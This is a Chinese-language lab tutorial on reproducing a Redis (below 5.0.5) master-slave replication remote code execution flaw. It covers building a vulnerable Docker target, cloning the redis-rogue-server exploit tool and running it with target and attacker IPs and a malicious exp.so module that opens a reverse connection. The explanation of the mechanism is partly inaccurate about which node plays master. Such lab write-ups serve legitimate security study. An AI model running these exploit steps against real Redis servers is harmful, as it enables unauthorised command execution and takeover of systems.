<h3 class="md-end-block md-heading"><span class="md-plain">一、漏洞原理</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Redis 主从复制机制中，</span><span class="md-pair-s "><strong><span class="md-plain">从节点可向主节点请求 “加载外部模块（</span><span class="md-pair-s" spellcheck="false"><code>MODULE LOAD</code></span><span class="md-plain">）”</span></strong></span><span class="md-plain"> 。当 Redis 版本 <5.0.5 且未限制远程连接 / 认证时，攻击者可伪装成 “从节点”，诱导主节点加载恶意模块（如 </span><span class="md-pair-s" spellcheck="false"><code>exp.so</code></span><span class="md-plain"> ）。恶意模块注入后，攻击者就能执行任意系统命令，实现远程控制。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">二、环境准备</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">（一）靶机环境搭建（模拟漏洞环境）</span></h4>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">拉取漏洞版本镜像</span></strong></span> <span class="md-plain">用 Docker 快速部署 Redis <5.0.5 环境（无 Docker 需先安装）：</span></p>



```bash
docker pull damonevking/redis5.0
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">启动靶机容器</span></strong></span> <span class="md-plain">映射 6379 端口，暴露给攻击机访问：</span></p>



```bash
docker run -d -p 6379:6379 damonevking/redis5.0 redis-server
```


</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">（二）攻击机环境准备</span></h4>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">工具依赖安装</span></strong></span> <span class="md-plain">攻击机需 Python3、Git 环境（Kali 默认已装），克隆漏洞利用脚本：</span></p>



```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server.git && cd redis-rogue-server
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">确认恶意模块</span></strong></span> <span class="md-plain">脚本目录内需有 </span><span class="md-pair-s" spellcheck="false"><code>exp.so</code></span><span class="md-plain">（Redis 恶意模块，用于执行系统命令，脚本默认自带或需自行编译 ）。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">三、漏洞复现流程</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">（一）攻击机：启动漏洞利用脚本</span></h4>
<p class="md-end-block md-p"><span class="md-plain">在 </span><span class="md-pair-s" spellcheck="false"><code>redis-rogue-server</code></span><span class="md-plain"> 目录执行命令，伪装成 “从节点” 攻击靶机：</span></p>



```bash
python3 redis-rogue-server.py --rhost 192.168.226.154 --lhost 192.168.226.133 --exp=exp.so
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>--rhost</code></span><span class="md-plain">：靶机 IP（主节点 Redis 地址 ）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>--lhost</code></span><span class="md-plain">：攻击机 IP（伪造从节点，用于接收反向连接 ）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>--exp</code></span><span class="md-plain">：指定恶意模块 </span><span class="md-pair-s" spellcheck="false"><code>exp.so</code></span><span class="md-plain">，诱导主节点加载</span></p>
</li>
</ul>
